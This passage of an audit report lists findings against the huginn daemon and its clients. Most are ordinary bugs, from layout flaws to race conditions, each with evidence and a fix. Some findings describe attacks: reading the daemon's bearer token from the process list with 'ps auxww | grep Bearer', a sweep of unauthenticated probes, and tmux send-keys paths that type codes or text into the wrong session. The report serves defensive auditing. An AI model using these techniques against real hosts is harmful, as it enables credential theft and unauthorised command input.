MarkdownText.kt:91-104: `Box(Modifier.width(2.dp).height(18.dp).background(...))` beside a Text with no height coupling — the Row wraps to the text height but the mark stays 18dp.
```

</details>

**Suggested fix:** Use Modifier.fillMaxHeight() on the mark inside Row(Modifier.height(IntrinsicSize.Min)), the standard Compose pattern for a text-height rule.

### `mobile/ui/src/commonMain/kotlin/com/silencelen/huginn/ui/TranscriptView.kt:367`

ToolCard's detail text is capped at half the leftover header width because it shares weight(1f) with the trailing Spacer, so file paths ellipsize while equal blank space sits unused beside them.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** A Read/Edit tool card for a normal repo path (e.g. app-desktop/src/main/kotlin/.../SessionView.kt) shows '…' at half the available width with a visible gap between the truncated path and the expand chevron, on both clients.

<details><summary>Evidence</summary>

```
TranscriptView.kt:359-370: detail Text has `modifier = Modifier.weight(1f, fill = false)` and is followed by `Spacer(Modifier.weight(1f))` — Row distributes leftover space equally between the two weighted children, so the detail's share is 50% regardless of need; fill=false lets it shrink but never grow past its half, and the spacer's half renders empty.
```

</details>

**Suggested fix:** Drop the trailing Spacer's weight (use Spacer(Modifier.width(8.dp))) or give the detail the full weight and end-align the chevron.

### `mobile/ui/src/commonMain/kotlin/com/silencelen/huginn/ui/TranscriptView.kt:473`

Em dashes appear in ~20 user-visible strings across both clients, violating the owner's no-em-dash copy rule — including the shared AskCard waiting line rendered on every unanswered question.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Every unanswered prompt card, the desktop mid-run composer placeholder, act-mode tooltips, the F1 cheat sheet and a dozen phone toasts display the em dash the owner has banned from displayed copy.

<details><summary>Evidence</summary>

```
grep for the character in string literals (ran it): shared :ui TranscriptView.kt:473 "Waiting for your answer — buttons below, or on the Screen tab"; desktop ChatView.kt:427 placeholder "Send anyway — it will queue behind this turn", Lists.kt:169 "Act mode — this chat can run commands...", Lists.kt:409 "$selected selected — right-click...", Shortcuts.kt:141 "every verb, one menu" row "Right-click" to "Open, rename, interrupt, delete — every verb, one menu"; phone MainActivity.kt:595, ReplyReceiver.kt:62+64 ("Not sent — huginn is unreachable..."), Dictation.kt:161, VoiceSheet.kt:140, SettingsScreen.kt:129/245/272/449/476/505, HuginnViewModel.kt:591/599/702/1418 (toasts), TerminalScreen.kt:247.
```

</details>

**Suggested fix:** Sweep the listed literals, replacing em dashes with the house separators already in use (" · ", commas, or sentence breaks); add a grep for the character over displayed-string files to the release checklist.

### `server/appd/deploy.sh:16`

deploy.sh places the huginn-appd bearer token in curl's argv, where /proc is world-readable and hidepid is not set, so the token is exposed to any local process for the duration of the request; the CLI does the same with the user's -p/-y prompt on both ends.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** provision/generic-host.md and docs/SECURITY.md both actively recommend running as a dedicated non-root user ("Prefer a non-root user"). On such a host, any other local account can `ps auxww | grep Bearer` during a deploy and lift the appd token (full API access to every chat, transcript and tmux session), or watch `ps` in a loop and capture every `huginn -p` / `huginn -y` prompt another user sends — including any secret pasted into a prompt.

<details><summary>Evidence</summary>

```
deploy.sh:15-16 `TOKEN="$(cat /etc/huginn-appd/token)"` then `curl -sf -H "Authorization: Bearer $TOKEN" http://...` — argv, not stdin/env.
RAN: `grep -E ' /proc ' /proc/mounts` -> `proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0` (no hidepid=1/2); `stat -c '%A %U' /proc/self/cmdline` -> `-r--r--r-- root`; a process launched with a marker argument was recoverable from `ps auxww` while alive.
Same class in the client: client/huginn.sh:220 interpolates the whole prompt into the single remote command string (`... echo '$q' | claude -p ...`), which sshd runs as `bash -c '<that string>'` on the host; client/huginn.ps1:242 `ssh -T $H "echo $b64 | base64 -d | bash -s"` puts a trivially reversible base64 of the prompt into both the local ssh.exe command line and the remote argv.
/etc/huginn-appd itself is correctly locked down (drwx------ root:root; token -rw------- root:root, 65 bytes).
```

</details>

**Suggested fix:** Pass the token via `curl -H @-` on stdin or `--config /dev/fd/N` instead of argv; for the CLI, feed the prompt to the remote shell over stdin (`ssh -T "$H" bash -s <<'EOF'`) rather than embedding it in the command string.

### `server/appd/huginn-appd.js:80`

mobile/README states uploads are "pruned after 7 days", but pruneUploads() runs only inside the upload route, so with no new uploads the retention promise does not hold.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner sends a photo of something sensitive (the README's own example is a screenshot of an error; the store also holds jpgs and a tax-export CSV) and stops using attachments. The file sits in /var/lib/huginn-appd/uploads at 0600 indefinitely — days, months — because the only thing that would delete it is another upload. The documented retention window is not a guarantee, on the same host whose daemon binds 0.0.0.0.

<details><summary>Evidence</summary>

```
mobile/README.md:59 and :194 both say "pruned after 7 days". huginn-appd.js:80 `function pruneUploads(maxAgeMs = 7 * 24 * 60 * 60 * 1000)` and grep for call sites returns exactly one: `2875:      pruneUploads();` — inside `if (req.method === 'POST' && p === '/v1/uploads')`. There is no timer, no startup sweep (unlike the pane-lease sweep at :480).
Current state of /var/lib/huginn-appd/uploads: the oldest file is 7 days old and still present because the last upload was 2026-07-30:
```
7 days  /var/lib/huginn-appd/uploads/img-1785279197583-fa8d3c.png
6 days  /var/lib/huginn-appd/uploads/img-1785280655436-9d10a3.jpg
```
```

</details>

**Suggested fix:** Call `pruneUploads()` from the startup sequence and from the existing periodic sweep (alongside `clientsLib.pruneClients` at :1446), so retention is time-based rather than traffic-based.

### `server/appd/huginn-appd.js:177`

readBodyRaw destroys the request socket when the 256KB cap is exceeded, so an oversized POST body gets a bare TCP reset with no HTTP status instead of the intended 400/413 - including for messages the route itself is supposed to reject with 'text too long'.

**lane** appd route authorization and HTTP surface · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** The chat route explicitly documents a 100,000-character message limit (`if (text.length > 100_000) return sendErr(res, 400, 'text too long')`), but that check is unreachable for any body over 256KB. A user pastes a 300KB log into a Huginn chat: instead of the clear 'text too long' the client sees a transport-level connection reset, which its retry logic treats as a network failure and retries - each retry resetting again. The same happens below 100,000 characters for non-ASCII text: 90,000 CJK characters is 90,000 UTF-16 units (passes the length check) but 270,000 UTF-8 bytes (exceeds the cap), so a legal message is reset rather than sent.

<details><summary>Evidence</summary>

```
Code (172-183):
  function readBodyRaw(req, limit = 256 * 1024) {
    return new Promise((resolve, reject) => {
      const chunks = []; let size = 0;
      req.on('data', (c) => {
        size += c.length;
        if (size > limit) { reject(new Error('body too large')); req.destroy(); return; }
The rejection surfaces in the shared catch at 3127-3131, which calls sendErr(res, 500, e.message) - but req.destroy() has already killed the socket, so nothing is delivered.

RAN against the scratch daemon:
  POST /v1/chats, 300KB body  -> code=000 size=0, curl exit 56 (Recv failure: Connection reset by peer)
  POST /v1/chats/<id>/messages, 300,000 'A' -> code=000, curl exit 56
  POST /v1/chats/<id>/messages, 120,000 'A' -> {"error":"text too long"} code=400
Daemon log for the 300KB case:
  ERROR POST /v1/chats/b34bae87-.../messages body too large
(no request line, no response reached the client; the daemon itself survives)
```

</details>

**Verifier's correction:** The socket-destroy-instead-of-status behaviour is exactly as claimed and worth the one-line fix (flag + drain + typed 413). But the failure scenario's 'retry logic treats it as a network failure and retries — each retry resetting again' is false: neither mobile nor desktop retries a message POST (Backoff is poll-only). The impact is a single confusing error on a >256KB paste, with no data loss, no daemon damage, and no plausible legal-message case for this deployment's mostly-ASCII traffic. LOW, not MED.

**Suggested fix:** Stop reading without destroying the socket, and answer with a real status: on overflow set a flag, `req.pause()`/`req.resume()` to drain, and reject with a typed error the handler maps to 413 (e.g. `const e = new Error('body too large'); e.status = 413; reject(e);` and in the catch `sendErr(res, e.status || 500, ...)` before any destroy). Also raise the cap on /v1/chats/:id/messages to at least 4x the 100,000-char limit so the route's own 400 is the one that fires.

### `server/appd/huginn-appd.js:1042`

A queued message returned to the queue after startRun refuses (concurrency cap) has no retry trigger and sits undelivered forever, despite the sender having been told it was queued.

**lane** appd async ordering, state persistence, and concurrency · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Owner has 4+ chats with messages queued (or queued during an outage) when huginn-appd restarts (deploys here are frequent): 3 deliver, the rest are refused with 429 and re-queued; those messages never run until another restart, or until the owner manually sends a NEW message to each stuck chat — and that new message jumps the queue, delivering the old ones out of order afterwards.

<details><summary>Evidence</summary>

```
startQueuedRun 1037-1048 re-queues on refusal (`m.pending = [{ text, ... }].concat(...)`) but nothing rescans: takePending is only invoked from a closing run of that same chat (906-911) and from deliverOrphanedQueues at startup (1091-1102). Demonstrated live on a scratch daemon with a fake `claude` binary: planted 4 chats with pending queues, restarted; log shows `chat 9c23183b...: run refused (too many concurrent runs (3)); 16 chars returned to the queue`; after all 3 runs finished, /v1/chats showed the 4th chat at `running: False | pending: 1 | turns: 0` and it remained stuck 32s later (and indefinitely — no code path can drain it).
```

</details>

**Verifier's correction:** The re-queue branch has no retry trigger (true, reproduced), but it is dead code in practice: the queue can only be populated for a chat that has an active run, so pending chats <= 3 = MAX_CONCURRENT_RUNS, and deliverOrphanedQueues can always start all of them. 'Owner has 4+ chats with messages queued' cannot occur — the 4th send is 429'd and never queued. Worth fixing defensively (the invariant is accidental, and raising MAX_PENDING chats or lowering MAX_CONCURRENT_RUNS would arm it), but it is LOW, not a real data-stranding bug today.

**Suggested fix:** Retry pending queues whenever a run slot frees: in the proc close handler after finish(), scan chatStates() for any chat with pending and no active run and startQueuedRun it (or add a low-frequency sweep timer doing the same).

### `server/appd/huginn-appd.js:1150`

resolveIdentity lacks the expired-token guard and negative cache its sibling planForCredentials has, so every GET /v1/accounts poll spends one doomed HTTPS 401 round-trip per stale profile, forever.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Phone settings screen polls /v1/accounts with the current 3-record store: ~0.5s of guaranteed-401 sequential fetches added to every poll; when the WAN is down or slow, the two aborts add up to 20s to the request and the accounts list appears hung.

<details><summary>Evidence</summary>

```
Line 1150 `if (!resp.ok) return null;  // expired token: keep what is stored` — the failure is not cached (only successes are, line 1160) and there is no expiresAt precheck, while planForCredentials line 1207 has exactly that guard with a comment naming this lesson ('asking anyway is not free... was starving the one read that matters'). The GET /v1/accounts loop (2312) calls it per profile, sequentially, on every settings poll. RAN IT: GET /v1/accounts measured 1.291s then 1.279s (no warm-up gain across runs = nothing cached); a 401 to api.anthropic.com/api/oauth/account costs 0.23-0.27s each and both stale profiles' tokens expired Jul 27/28, so the two doomed calls recur every poll; each also holds a 10s abort budget.
```

</details>

**Verifier's correction:** Real but minor: resolveIdentity is missing the expiresAt precheck and a negative cache that its sibling has, costing ~0.45s of guaranteed-401 round-trips. It is paid when the Settings screen is opened or after an account action, not on a poll loop — there is no /v1/accounts polling on any client. LOW.

**Suggested fix:** Mirror planForCredentials: `const o = creds.claudeAiOauth; if (typeof o.expiresAt === 'number' && o.expiresAt <= Date.now()) return null;` before fetching, plus a short-TTL negative cache keyed by fingerprint.

### `server/appd/huginn-appd.js:1631`

performSwitch never verifies or re-asserts the switch, so a pre-switch Claude session's later token refresh writes the OLD account's credentials back over the new ones, silently un-switching the host.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW

**What goes wrong:** Autoswitch moves A(96%)->B at 13:00 while three of the owner's long-lived tmux sessions still run on A. At 14:30 one of them refreshes and rewrites ~/.claude/.credentials.json with A's fresh pair: every NEW run is back on the dry account, the 'Switched' notification was wrong, and for a manual Settings-button switch nothing ever corrects it or tells anyone. Autoswitch only re-notices at the next tick outside the 30-min cooldown, then switches again — refresh-vs-switch ping-pong, one notification per round.

<details><summary>Evidence</summary>

```
accounts.js:12-13 documents the mechanism the daemon itself relies on: 'A running process also writes REFRESHED tokens back to that file, so the outgoing account is snapshotted immediately before every swap' — the snapshot protects the outgoing tokens but nothing guards the incoming ones afterwards. performSwitch (1631-1650) reads `after = await accountStatus()` but never compares it to the requested slug, never watches CREDENTIALS_PATH afterwards; autoswitch sets lastSwitchAt and notifies success regardless (1743-1754). The autoswitch notification's own text concedes 'Running sessions keep the old account until they restart' — those sessions hold the old refresh token and write the whole file on refresh.
```

</details>

**Verifier's correction:** 'performSwitch never verifies the switch' is CONFIRMED and is a cheap gap to close. 'Silently un-switching the host' is not demonstrated here and is overstated: the app's account view reads live credentials so the state is visible, and autoswitch self-corrects within ~35 min (at the cost of a duplicate notification). Only the manual-switch-with-autoswitch-off case is uncorrected. LOW pending a real observation of a post-switch clobber.

**Suggested fix:** After activate, and on an fs.watch of CREDENTIALS_PATH for N hours post-switch: if fingerprint(readActive()) matches a stored profile other than the activated one, re-assert the switch once (re-snapshotting the clobberer first) or send a corrective notification.

### `server/appd/huginn-appd.js:1746`

autoswitchTick persists a whole-object autoswitch state snapshot loaded before its many awaits, silently reverting any POST /v1/autoswitch settings change (enabled/threshold) that lands mid-tick.

**lane** appd async ordering, state persistence, and concurrency · **contract** C10 · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW

**What goes wrong:** Active account crosses 95%; the 5-min tick starts pricing candidates and switching (tens of seconds of network awaits). Owner taps autoswitch OFF in Settings (POST saves enabled:false) during that window. The tick completes the switch and saveAutoswitch(st) writes enabled:true (and the pre-change threshold) back to disk — the off toggle appears to take, then undoes itself, and autoswitch keeps rotating accounts every 5 minutes against an explicit disable.

<details><summary>Evidence</summary>

```
Line 1681 `const st = loadAutoswitch();` then awaits at 1688 (`await saveIdentified(null, accounts.readActive())`), 1697/1718 (`await planForCredentials(...)` — fetch, 10s timeout each), 1740 (`await performSwitch(d.to)`), then 1743-1746: `st.lastSwitchAt = Date.now(); st.switches = (st.switches || 0) + 1; st.last = {...}; saveAutoswitch(st);` — writes the stale st.enabled/st.threshold back. Contrast alertTickInner 1926-1948, which reloads and merges only tick-owned fields precisely because 'a POST /v1/alerts landing meanwhile ... was silently reverted the moment the tick finished'. The route (2124-2134) writes enabled/threshold to the same file.
```

</details>

**Verifier's correction:** Only ticks that COMPLETE A SWITCH write autoswitch.json; the ~99.9% of ticks that return early cannot revert anything. The defect is a real (and cheap-to-fix) snapshot-write asymmetry against alertTickInner, but its trigger is a several-second race on a code path that has never executed in production. LOW, not MED.

**Suggested fix:** Mirror alertTickInner: at the end of the tick, `const fresh = loadAutoswitch();` and write only the fields the tick owns (lastSwitchAt, switches, last), leaving fresh.enabled/fresh.threshold as found; also re-check fresh.enabled before performSwitch.

### `server/appd/huginn-appd.js:2031`

The request logger records no client address, so on a daemon deliberately bound to 0.0.0.0 with no rate limiting or lockout there is no way to attribute a 401 to a source.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A compromised or misconfigured host on VLAN 2 (or anything that reaches 192.168.2.117 via the Yggdrasil LAN gateway) starts probing 8787 with stale or guessed tokens. The journal fills with `GET /v1/ping 401 0ms` lines that are indistinguishable from the owner's own phone holding an expired token after a rotation. There is no way to answer 'is this my device or someone else's' without packet capture, and no signal that would ever escalate - the daemon's own logs cannot support the investigation of an attack on the daemon.

<details><summary>Evidence</summary>

```
Code (2031):
  res.on('finish', () => log(`${req.method} ${p} ${res.statusCode} ${Date.now() - t0}ms`));
No `req.socket.remoteAddress`, no X-Forwarded-For, and no counter/backoff anywhere in the file (grep for rate/limit/lockout/attempt in the auth path: nothing).

RAN: after my unauthenticated probe sweep, `journalctl -u huginn-appd --since -10min | grep -c 401` = 59, sample:
  2026-08-04T20:37:21.936Z GET /v1/ping 401 1ms
  2026-08-04T20:37:21.954Z GET /v1/status 401 1ms
Deployed bind is 0.0.0.0 (/etc/systemd/system/huginn-appd.service.d/override.conf, `Environment=HUGINN_APPD_BIND=0.0.0.0`), so the listener is reachable from the tailnet, the Yggdrasil mesh LAN gateway, and both server VLANs. Token metadata: 64 chars, hex-only, 16 distinct symbols = 256 bits, so guessing is not the risk - attribution is.
```

</details>

**Suggested fix:** Include the peer in the line and count failures: `const ip = req.socket.remoteAddress;` in the finish handler, and on a 401 additionally `log('auth: rejected from', ip)` with a simple per-IP counter that Telegrams once when a source crosses e.g. 20 failures in 10 minutes.

### `server/appd/huginn-appd.js:2031`

The request logger is attached to 'finish' only, so every request the client aborts is never logged at all - which is exactly the class of request that leaks resources.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The desktop updater repeatedly fails to complete an installer download over a flaky Yggdrasil link. Every attempt aborts. The owner checks `journalctl -u huginn-appd` to find out why updates are not landing and sees no evidence that the client ever asked for the artifact at all - the failure is only visible on the client. The same blind spot hides the fd leak above, and hides the reset responses from the oversized-body path from anyone reading only request lines.

<details><summary>Evidence</summary>

```
Code (2031):
  res.on('finish', () => log(`${req.method} ${p} ${res.statusCode} ${Date.now() - t0}ms`));
'finish' fires only when the response is written to completion; an aborted connection emits 'close' without 'finish'.

RAN: 60 aborted GETs of /v1/desktop/Huginn-Setup-9.9.9.exe produced 60 leaked fds and ZERO log lines - the scratch daemon's log tail after the run was still just:
  2026-08-04T20:43:41.062Z push: FCM ready for project huginn-push-monahan
  2026-08-04T20:43:41.110Z huginn-appd 2.52.2 listening on 127.0.0.1:8799
Similarly, 5 prematurely-closed POST /v1/uploads requests logged only the handler's own `uploads: ... aborted after 1000 bytes` line, never a request line.
```

</details>

**Suggested fix:** Log on 'close' instead, recording whether the response completed: `res.on('close', () => log(`${req.method} ${p} ${res.writableFinished ? res.statusCode : 'ABORTED'} ${Date.now() - t0}ms`));`

### `server/appd/huginn-appd.js:2038`

Every route matches on `req.method === 'GET'` explicitly, so HEAD requests fall through the entire router to the catch-all and get 404 on paths that exist.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** An operator adds huginn-appd to Uptime-Kuma (gjallarhorn CT260) as an HTTP monitor - Kuma's default method for a keyword/status check is GET but HEAD is a one-click option and the natural choice for a health probe you do not want to log a body for. The monitor reports the daemon as DOWN (404) while it is perfectly healthy, and the operator concludes appd is broken. Same for any `curl -I` spot-check of an update artifact, which reports the installer as missing.

<details><summary>Evidence</summary>

```
All read routes are guarded as `if (req.method === 'GET' && p === '/v1/ping')` (2038), `... p === '/v1/status'` (2039), `... (m = p.match(/^\/v1\/desktop\/([^/]+)$/))` (2844), etc. Nothing handles 'HEAD', and the fall-through at 3126 is `return sendErr(res, 404, 'not found')`.

RAN:
  curl -I -H 'Authorization: Bearer <tok>' .../v1/ping                        -> HTTP/1.1 404 Not Found
  curl -I -H 'Authorization: Bearer <tok>' .../v1/desktop/Huginn-Setup-9.9.9.exe -> HTTP/1.1 404 Not Found
(both files/routes exist and answer 200 to GET)
```

</details>

**Suggested fix:** Treat HEAD as GET for the read routes: near the top of the handler, `const method = req.method === 'HEAD' ? 'GET' : req.method;` and match on `method` throughout (Node already suppresses the body for HEAD responses automatically).

### `server/appd/huginn-appd.js:2061`

POST /v1/push/register caps installId (64) and model (60) but stores the FCM token with no length limit, so push.json can be inflated to megabytes and is re-read and JSON.parsed on every /v1/watch call and every alert tick.

**lane** alerting / watch / FCM push / push tokens / notify claim · **verdict** not separately verified

**What goes wrong:** Anything holding the bearer token — a buggy client build, or a script re-using the token — posts 20 registrations with 250 KB tokens. push.json becomes ~5 MB. Every parked phone's watch stream then does a 5 MB synchronous read and parse on each state change, and each alert tick does it twice per alert, blocking the single-threaded daemon's event loop and delaying every other request. Nothing rejects it and nothing prunes it: only a genuine FCM dead-token verdict removes an entry.

<details><summary>Evidence</summary>

```
huginn-appd.js:2060-2064 — `const installId = String(body.installId || '').trim().slice(0, 64); const token = String(body.token || '').trim();` (no slice) — and pushtokens.js:40 stores it verbatim. readBody caps a body at 256 * 1024 (huginn-appd.js:167), and MAX_TOKENS is 20 (pushtokens.js:17), so ~5 MB is reachable. loadPushState() does a synchronous readFileSync+JSON.parse and is called at huginn-appd.js:2224 (inside the stream loop, per state event), 2269 (every long poll), 2052-2053 (twice per GET /v1/alerts), and 1531/1565 (twice per deliverPush).
```

</details>

**Suggested fix:** Bound it like the other fields — `String(body.token || '').trim().slice(0, 4096)` (real FCM registration tokens are ~163-300 chars) — and reject anything longer with a 400 rather than truncating to a token that can never deliver. Optionally cache the parsed push state in memory the way clientState already is, since this process is the only writer.

### `server/appd/huginn-appd.js:2232`

The /v1/watch SSE stream stamps client liveness (noteClient) only in the keepalive branch, so a stream continuously delivering state events lets the client's lastAt go stale and appOnline() falsely reports no listener, causing duplicate Telegram delivery.

**lane** appd async ordering, state persistence, and concurrency · **contract** C7 · **verdict** not separately verified

**What goes wrong:** Desktop client (no FCM) holds the watch stream during a busy stretch: 3-4 sessions plus chats transitioning running/idle/attention with under 25s between digest changes for 3+ minutes. A session then hits 'attention': the phone/desktop shows it from the stream AND appOnline()==false routes the same alert to Telegram — the exact double-delivery the fallback design exists to prevent.

<details><summary>Evidence</summary>

```
Lines 2215-2233: the state-event branch (`res.write('event: state...')`; `nextKeepalive = Date.now() + KEEPALIVE_MS;`) does NOT call noteClient; only the `else if (Date.now() >= nextKeepalive)` branch does (`noteClient(req, 'stream')` at 2232). Every state event pushes nextKeepalive 25s forward, so sustained digest churn with gaps under 25s for FRESH_STREAM_MS (3 min, lib/clients.js:31) starves the stamp. alertTickInner 1850: `const appReached = pushedAny || clientsLib.appOnline(clientState, now);` — with no FCM devices delivering (desktop-only watcher, or dead tokens), appOnline is the sole suppressor of the Telegram fallback.
```

</details>

**Suggested fix:** Call noteClient(req, 'stream') in the state-event branch too (each successful write proves the path), or stamp on every loop iteration where the socket is still writable.

### `server/appd/huginn-appd.js:2316`

The GET /v1/accounts re-label loop (and saveIdentified at 1688) writes credentials captured before an await back into a profile, which can overwrite a rotation recorded meanwhile and regress a stored login to dead tokens.

**lane** appd async ordering, state persistence, and concurrency · **contract** C10 · **verdict** not separately verified

**What goes wrong:** A profile needs re-labeling (email/uuid mismatch) at the same moment its tokens rotate and are saved by a concurrent path: the loop's save writes the pre-rotation refresh token back over the fresh pair; if the old refresh token has been consumed server-side, the next activate of that profile installs dead credentials and the stored login stops authenticating (the store's own header calls a lost login the one unrecoverable failure).

<details><summary>Evidence</summary>

```
2310-2320: `const rec = accounts.readProfile(a.slug);` then `const id = await resolveIdentity(rec.credentials);` (network, up to 10s) then `accounts.save(id.email ?? rec.email, rec.credentials, {...})`. accounts.js save() line 278 stores `credentials: creds` — a wholesale replace, keyed to the same uuid slug. Concurrent writers exist: autoswitchTick's `saveIdentified(null, accounts.readActive())` (1688, every 5 min) and a second concurrent GET /v1/accounts (phone + desktop Settings open together), both of which can file freshly rotated tokens into the same profile during the await.
```

</details>

**Suggested fix:** Have accounts.save refuse to replace credentials with an older blob (compare savedAt or keep credentials only when fingerprint differs from what is on disk at write time), or re-read the profile after the await and only save if credentials are unchanged.

### `server/appd/huginn-appd.js:2397`

The account sign-in flow adopts any pre-existing tmux session literally named 'login' without checking it is actually running `claude auth login`, and /v1/account/login/code then types the code plus Enter into it.

**lane** command and tmux injection in appd · **verdict** not separately verified

**What goes wrong:** The owner has a long-lived tmux session called `login` (a plausible name — e.g. a shell where they were debugging an auth flow, or a Claude session about login code). They tap "add account" in the app: the daemon returns existed:true with url:null, the Screen view shows that unrelated pane, and when they paste the OAuth code the daemon types it plus Enter into that session — sending the code as a message to a live Claude agent, or executing it as a shell command, while the real sign-in never starts.

<details><summary>Evidence</summary>

```
```js
2389: const name = 'login';
2397: const existed = await sessionExists(name);
2398: if (!existed) {
2399:   const r = await run('tmux', ['new-session', '-d', '-s', name, '-c', WORKDIR,
2400:     'claude auth login; echo; echo "[done] press enter"; read _']);
2402: }
...
2421: return sendJson(res, existed ? 200 : 201, { ok: true, session: name, existed, url: out, ... });
```
and the code route's only precondition is the same existence test:
```js
2440: if (!(await sessionExists('login'))) return sendErr(res, 409, 'no sign-in is in progress');
2443: const send = await run('tmux', ['send-keys', '-t', '=login:', '-l', '--', code]);
2445: await run('tmux', ['send-keys', '-t', '=login:', 'Enter']);
```
Nothing inspects the pane's command, cwd or content to confirm it is the sign-in TUI. `extractLoginUrl` returning null on a foreign pane is handled as "URL not ready yet", not as "this is not a login session".
```

</details>

**Suggested fix:** Use a name that cannot collide (`huginn-login`), and before adopting an existing one verify it is the sign-in pane — check `#{pane_current_command}`/`#{pane_start_command}` for `claude auth login`, and refuse with 409 otherwise.

### `server/appd/huginn-appd.js:2502`

/v1/plan has no failure backoff: planCache.at is only advanced on success, so while the endpoint fails every poll re-fetches inline with a 15s abort budget.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **verdict** not separately verified

**What goes wrong:** WAN outage: every settings poll's /v1/plan awaits a fresh doomed fetch for up to 15s instead of failing fast from cache — the plan row hangs each cycle for the outage's duration (planCache.running only dedupes concurrent requests, not successive ones).

<details><summary>Evidence</summary>

```
Line 2502 `if (Date.now() - planCache.at > PLAN_TTL_MS && !planCache.running) await fetchPlan();` and fetchPlan only sets `planCache.at = Date.now()` on the success path (1320); errors leave at=0. The sibling usageCache has exactly the missing piece: `failedAt` + USAGE_RETRY_MS backoff (1332-1336, 2513).
```

</details>

**Suggested fix:** Add failedAt + a PLAN_RETRY_MS gate mirroring the usage cache.

### `server/appd/huginn-appd.js:2710`

/v1/sessions/:name/keys sends the literal text to the pane BEFORE validating the keys array, so a request rejected with HTTP 400 has already delivered its text — and a client that retries on 400 types it twice.

**lane** command and tmux injection in appd · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** The desktop client's key mapper emits a key outside NAMED_KEYS (any of PrintScreen, Menu, Pause, a numpad key, or a future addition) inside a coalesced burst that also carries the characters the user just typed. The daemon types those characters into the Claude Code composer and returns 400. The client sees 400 = not delivered and re-sends the batch, so the composer holds the text twice; the user presses Enter and the agent receives "transfer 500transfer 500".

<details><summary>Evidence</summary>

```
The side effect precedes the validation:
```js
2697: if (typeof body.text === 'string' && body.text.length > 0) {
2699:   const r = await run('tmux', ['send-keys', '-t', `=${name}:`, '-l', '--', body.text]);  // DELIVERED
2707: }
2708: if (Array.isArray(body.keys)) {
2709:   if (body.keys.length > 32) return sendErr(res, 400, 'too many keys');                   // too late
2711:   if (!validKey(k)) return sendErr(res, 400, `key not allowed: ${k}`);                    // too late
```
The comment at :620-625 shows this batching is real and that an unknown key rejecting a whole batch has already bitten once: "the client coalesces a burst of keystrokes into ONE request, so a single Insert took every character batched alongside it down with a 400." That was fixed by widening NAMED_KEYS, not by ordering the validation, so any future unmapped key reproduces it.

RAN IT against the LIVE daemon on a scratch session:
```
$ curl -X POST .../v1/sessions/audit-inj-order/keys -d '{"text":"transfer 500","keys":["Enter","Foo"]}'
{"error":"key not allowed: Foo"}   HTTP 400
pane received: transfer 500          <-- delivered despite the 400
$ curl -X POST ... -d '{"text":"transfer 500","keys":["Enter"]}'      (client retries)
{"ok":true}   HTTP 200
pane now holds: transfer 500
                transfer 500
```
The same shape exists inside the loop at :2713-2716: keys 1..n-1 are delivered before a mid-loop tmux failure returns 500.
```

</details>

**Verifier's correction:** The side-effect-before-validation is confirmed, but the consequence is not: no shipped client can construct a request with text plus an invalid or >32 key array (desktop toWire never mixes text and keys and drops bad keys; mobile sends Text/Key ops as separate requests; the only mixed body in the whole codebase is {text, keys:['Enter']}), and no client retries on 400. Impact is therefore robustness/atomicity of the API for a hand-crafted request, not double-typed text in the owner's composer — LOW, not MED.

**Suggested fix:** Validate the whole payload before any tmux call — move the `body.keys.length > 32` and `validKey` loop above the text branch at :2697 so the route is all-or-nothing.

### `server/appd/huginn-appd.js:2810`

An answer for a two-digit option is sent as two separate literal keypresses, and the route reports success for the multi-digit option regardless of what the selector actually did with the first digit.

**lane** command and tmux injection in appd · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** An AskUserQuestion dialog offers 12 options and the owner taps option 12 from the app. The daemon types '1', '2', Enter. If the selector acts on the first digit (as it demonstrably does for multi-select toggles), option 1 is chosen and submitted, the stray '2' lands in the composer, and the app displays {ok:true, option:12, label:"..."} — telling the owner they picked the twelfth option when they picked the first.

<details><summary>Evidence</summary>

```
```js
2737: if (!isMulti && (!Number.isInteger(option) || option < 1 || option > 20))   // 10..20 accepted
2810: const typed = await run('tmux', ['send-keys', '-t', `=${name}:`, '-l', '--', String(option)]);
2812: const enter = await run('tmux', ['send-keys', '-t', `=${name}:`, 'Enter']);
2815: return sendJson(res, 200, { ok: true, option, label: chosen.label });
```
`String(12)` reaches the pane as the characters '1','2'. The comment at :2808 ("literal digit first, so a multi-digit option cannot be split across a submit") addresses ordering against Enter, not whether the TUI consumes the first digit on its own. multiToggleDigits (lib/pane.js:240) has the same shape, and pane.js's own comment says "digits toggle, verified live" — i.e. the selector is known to act per keypress in the multi-select case.

RAN IT — confirmed the two-digit path is genuinely reachable: a scratch pane with 12 numbered options is detected and offered by the daemon.
```
$ curl .../v1/sessions/audit-inj-12/screen | jq .prompt
prompt detected: True
option count: 12 | last: {'number': 12, 'label': 'DESTROY EVERYTHING', 'selected': False}
```
HONEST LIMIT: I did not verify how Claude Code's real single-select dialog treats '1' followed by '2', because doing so would require driving a live Claude selector, which the rules forbid. What IS established from the code alone is that the daemon returns ok:true + the 2-digit label without ever re-reading the pane to confirm the selection took.
```

</details>

